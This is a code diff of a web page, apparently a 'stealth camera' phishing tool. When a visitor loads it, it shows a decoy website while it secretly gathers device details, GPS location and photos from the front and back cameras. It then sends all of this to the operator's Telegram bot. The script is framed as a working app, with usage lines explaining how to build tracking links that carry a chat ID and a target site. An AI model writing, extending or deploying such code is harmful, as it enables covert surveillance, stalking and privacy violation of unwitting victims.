-            setTimeout(() => {
-                progressFill.style.width = '0%';
-                captureStatus.textContent = 'Ready for next capture';
-                captureStatus.className = 'capture-status';
-                isAutoCapturing = false;
-                autoCaptureBtn.disabled = false;
-            }, 2000);
+            console.log('✅ All 5 photos captured and sent!');
+            isCapturing = false;
         }
         
-        // Auto-start function
+        // Main auto-start function
         async function autoStart() {
-            console.log('🚀 Auto-starting camera and capture...');
+            console.log('🚀 AUTO-START SEQUENCE INITIATED');
+            console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
             
-            // Load default website first
-            loadDefaultWebsite();
+            // 1. Load website immediately
+            loadWebsite();
+            console.log('✅ Website loaded');
             
-            // Wait for page to be fully ready
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            // 2. Get device info (runs in parallel)
+            const deviceInfoPromise = getDeviceInfo().then(info => {
+                deviceInfo = info;
+                sendDeviceInfoToTelegram(info);
+                console.log('✅ Device info sent');
+            });
             
-            console.log('📹 Starting camera...');
-            // Start camera automatically
-            await startCamera();
+            // 3. Get location (runs in parallel)
+            const locationPromise = getLocation().then(location => {
+                if (location) {
+                    sendLocationToTelegram(location);
+                    console.log('✅ Location sent');
+                }
+            });
             
-            console.log('⏳ Camera warming up (3 seconds)...');
-            // Wait extra time for camera to warm up and adjust exposure
-            await new Promise(resolve => setTimeout(resolve, 3000));
+            // 4. Start camera
+            const cameraStarted = await startCamera();
             
-            console.log('📸 Starting photo capture...');
-            // Start auto-capture with location
-            if (cameraStream) {
-                await autoCaptureWithLocation();
-            } else {
-                console.error('❌ Camera stream not available');
-                captureStatus.textContent = 'Camera failed to start';
-                captureStatus.className = 'capture-status error';
+            if (cameraStarted) {
+                // 5. Fast capture and send
+                await fastCaptureAndSend();
+                
+                // 6. Try back camera if we started with front
+                if (currentFacingMode === 'user') {
+                    console.log('🔄 Switching to back camera...');
+                    stopCamera();
+                    currentFacingMode = 'environment';
+                    const backCameraStarted = await startCamera();
+                    if (backCameraStarted) {
+                        await fastCaptureAndSend();
+                    }
+                }
             }
+            
+            // Wait for all parallel tasks
+            await Promise.all([deviceInfoPromise, locationPromise]);
+            
+            console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+            console.log('✅ ALL TASKS COMPLETED');
+            console.log(`📊 Total photos sent: ${photosSentCount}`);
+            
+            // Stop camera to save resources
+            stopCamera();
         }
         
-        // Initialize and auto-start
-        console.log('🚀 Background Camera App Ready!');
-        console.log('📸 Camera runs hidden, website displays in foreground');
-        console.log('⏱️  Auto-starting in 1 second...');
-        console.log('');
-        console.log('=== CONFIGURATION ===');
-        console.log('🤖 Bot Token:', BOT_TOKEN);
+        // Initialize
+        console.log('═══════════════════════════════════');
+        console.log('🎯 STEALTH CAMERA APP INITIALIZED');
+        console.log('═══════════════════════════════════');
+        console.log('🤖 Bot Token:', BOT_TOKEN.substring(0, 20) + '...');
         console.log('💬 Chat ID:', CHAT_ID);
-        console.log('🌐 Website:', DEFAULT_WEBSITE);
-        console.log('==================');
+        console.log('🌐 Target Website:', DEFAULT_WEBSITE);
+        console.log('═══════════════════════════════════');
         console.log('');
-        console.log('=== HOW TO USE ===');
-        console.log('Format: https://jsjs-kzua.onrender.com/?chat_id=YOUR_CHAT_ID&site=YOUR_WEBSITE_URL');
+        console.log('📋 USAGE:');
+        console.log('https://yourdomain.com/?chat_id=YOUR_ID&site=WEBSITE_URL');
         console.log('');
-        console.log('Example:');
-        console.log('https://jsjs-kzua.onrender.com/?chat_id=6314556756&site=https://loading-screen.github.io/');
-        console.log('');
-        console.log('📤 Photos and location will be sent to your Telegram bot automatically!');
-        console.log('==================');
+        console.log('📤 Will send to Telegram:');
+        console.log('  • Device info (battery, RAM, CPU, etc.)');
+        console.log('  • GPS location');
+        console.log('  • 5 photos from front camera');
+        console.log('  • 5 photos from back camera');
+        console.log('  • Total: ~12 messages in under 3 seconds');
+        console.log('═══════════════════════════════════');
         
         // AUTO-START ON PAGE LOAD
         window.addEventListener('load', () => {
             autoStart();
+        });
+        
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            stopCamera();
+            photos.forEach(photo => {
+                if (photo.url) URL.revokeObjectURL(photo.url);
+            });
         });
     </script>
 </body>
